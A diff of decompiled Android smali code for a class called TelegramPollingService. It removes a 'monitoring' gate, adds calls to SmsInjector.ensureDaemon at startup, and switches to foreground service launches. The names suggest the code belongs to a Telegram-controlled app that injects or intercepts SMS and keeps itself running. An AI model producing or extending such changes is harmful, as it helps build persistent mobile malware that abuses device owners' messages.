@@ -386,16 +386,9 @@
     .locals 1
 
     .line 515
-    iget-boolean p1, p0, Lcom/astik/module/TelegramPollingService;->monitoring:Z
-
     const-string v0, ""
 
-    if-nez p1, :cond_0
-
-    return-object v0
-
     .line 516
-    :cond_0
     iget-object p1, p0, Lcom/astik/module/TelegramPollingService;->cfgDb:Ljava/lang/String;
 
     invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z
@@ -678,6 +671,8 @@
 
     .line 526
     :cond_0
+    invoke-static {p0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z
+
     invoke-direct {p0, v2}, Lcom/astik/module/TelegramPollingService;->readConfig(Landroid/content/SharedPreferences;)V
 
     .line 528
@@ -2766,7 +2761,7 @@
     invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     .line 145
-    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p0, v0}, Lcom/astik/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
     :try_end_1
     .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
 
@@ -2831,6 +2826,8 @@
     .line 101
     invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->startPollThread()V
 
+    invoke-static {p0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z
+
     .line 102
     invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->startConfigThread()V
 
@@ -2894,16 +2891,6 @@
     invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     .line 118
-    invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
-
-    .line 119
-    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
-
-    const/16 v1, 0x1a
-
-    if-lt v0, v1, :cond_0
-
-    .line 120
     invoke-virtual {p0, p1}, Lcom/astik/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
